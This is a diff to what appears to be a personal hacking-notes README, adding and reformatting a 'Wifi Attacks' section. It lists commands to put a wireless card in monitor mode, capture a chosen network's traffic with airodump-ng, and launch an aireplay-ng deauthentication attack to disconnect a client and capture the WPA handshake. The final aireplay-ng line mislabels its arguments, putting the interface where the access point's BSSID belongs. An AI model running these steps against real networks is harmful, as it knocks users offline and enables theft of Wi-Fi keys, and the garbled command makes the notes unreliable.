@@ -102,16 +102,20 @@ Listen for incoming connections to establish exploit:
 ![Listen for incoming connections to establish exploit](https://github.com/user-attachments/assets/8d877b1c-bb98-4d60-9e12-1e82c6eac25e)
 
 Wifi Attacks:
-  * sudo iw dev - shows wireless devices and their configuration
-  * sudo iw dev (device/interface) scan - scan nearby Wifi networks using the device
-  * sudo iw dev (device/interface) set type monitor - change device to monitor mode
-    * turn device/interface off before doing this
-    * turn device/interface on after
-  * sudo ip link set dev (device/interface) up - turn device on
-  * sudo ip link set dev (device/interface) down - turn device off
-  * sudo iw dev (device/interface) info - shows status of device
-  * sudo airodump-ng (device/interface) - shows list of nearby wifi networks and important details like encryption type
-    * CAN QUITE WHEN FIND DESIRED NETWORK
-  * sudo airodump-ng -c (# channels to listen to) --bssid (bssid of network) -w output-file (device/interface) - targets specific network channel to capture traffic and save it files that start with output-file\
-    * KEEP RUNNING
-  * Attack device connected to access point (BSSID under STATION section)
+* sudo iw dev - shows wireless devices and their configuration
+* sudo iw dev (device/interface) scan - scan nearby Wifi networks using the device
+* sudo iw dev (device/interface) set type monitor - change device to monitor mode
+  * turn device/interface off before doing this
+  * turn device/interface on after
+* sudo ip link set dev (device/interface) up - turn device on
+* sudo ip link set dev (device/interface) down - turn device off
+* sudo iw dev (device/interface) info - shows status of device
+* sudo airodump-ng (device/interface) - shows list of nearby wifi networks and important details like encryption type
+  * CAN QUITE WHEN FIND DESIRED NETWORK
+* sudo airodump-ng -c (# channels to listen to) --bssid (bssid of network) -w output-file (device/interface) - targets specific network channel to capture traffic and save it files that start with output-file\
+  * KEEP RUNNING
+* Attack device connected to access point (BSSID under STATION section)
+* open second terminal to launch deauthentication attack
+  * using aireplay-ng to send deauthentication packets to disconnect wifi connection
+  * capture reconnection 4-way handshake using airodump-ng that is being run
+  * sudo aireplay-ng -0 1 -a (device/interface) -c (BSSID of device connected to access point)
